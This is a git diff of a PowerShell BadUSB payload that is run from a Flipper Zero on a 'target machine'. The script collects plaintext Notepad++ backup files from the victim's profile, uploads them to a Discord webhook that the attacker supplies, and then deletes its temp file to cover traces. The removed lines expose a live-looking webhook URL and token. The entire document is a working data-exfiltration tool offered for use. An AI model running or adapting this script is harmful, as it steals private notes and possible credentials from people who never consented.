@@ -4,7 +4,7 @@
     The purpose of this script is to read and export information which may be held in NotePad++ backups.
 
 .DESCRIPTION
-    This script is designed to work in conjunction with "Snoop.txt" to extract the information from NotePad++ backups using FlipperZero.
+    This script is designed to work in conjunction with "SnoopPlusPlus.txt" to extract the information from NotePad++ backups using FlipperZero.
     Backups are stored in plaintext at C:\Users\<USERNAME>\AppData\Roaming\NotePad++\backup.
     This script will read the backup contents, export them to a file in the user temp directory and then upload them to your
     Dropbox if you provide a valid API key.
@@ -16,16 +16,17 @@
 
     Updated:    05/06/2024      -First version of standalone script.
                 06/06/2024      -Changed exfil method to Discord over DropBox.
+                                -Added cleanup at end to remove created Temp file.
 
 .LINK 
     https://github.com/contrxl/flipper-stuff/tree/main/badusb
 
 .EXAMPLE
     To run this as intended with FlipperZero:
-        - Take a copy of "Snoop.txt"
+        - Take a copy of "SnoopPlusPlus.txt"
         - Insert your Discord Webhook URL in the $dc variable.
-        - Upload "Snoop.txt" to your FlipperZero in the SDCard/badusb/ folder.
-        - Connect FlipperZero to target machine and run "Snoop.txt" from badusb.
+        - Upload "SnoopPlusPlus.txt" to your FlipperZero in the SDCard/badusb/ folder.
+        - Connect FlipperZero to target machine and run "SnoopPlusPlus.txt" from badusb.
 #>
 
 $FileName = "$ENV:tmp/$ENV:USERNAME-NPPlusData-$(Get-Date -f hh-mm_dd-MM-yyyy).txt"
@@ -38,11 +39,11 @@ $filelist = Get-ChildItem $fullpath\*@*
 function Get-backupContents{
     <#
     .SYNOPSIS
-    This function reads the contents of the stored NotePad++ backups, currently there is no action taken if no backups are present.
+        This function reads the contents of the stored NotePad++ backups, currently there is no action taken if no backups are present.
 
     .NOTES
-    To do: 
-        - Add error or output message indicating that no backups could be found or accessed. Currently it will export a blank file.
+        To do: 
+            - Add error or output message indicating that no backups could be found or accessed. Currently it will export a blank file.
     #>
     $backupcontents = ForEach ($filepath in $filelist)
     {
@@ -61,10 +62,7 @@ $out > $FileName
 
 <#
 .SYNOPSIS
-This function uploads the collected data to your Discord channel when an API key is provided as $dc.
-.NOTES
-To do:
-    - Add clean up here to remove the temp file created after it is uploaded.
+    This function uploads the collected data to your Discord channel when an API key is provided as $dc.
 #>
 function exfilDiscord {
     [CmdletBinding()]
@@ -75,7 +73,7 @@ function exfilDiscord {
         [string]$text
     )
 
-    $webHook = "https://discordapp.com/api/webhooks/1248365194313465870/CkLP8xuVh2r9ZNoYeM2TnuJJ00iPGtvOeeZx3n0P4SMOeTX2DnF9Sx_Bq1bip2vngf2A"
+    $webHook = "$dc"
 
     $body = @{
         'username' = $ENV:USERNAME
@@ -95,4 +93,5 @@ if (-not ([string]::IsNullOrEmpty($dc))){
     exfilDiscord -file $FileName
 }
 
+# Clean up Temp file created.
 Remove-Item $FileName
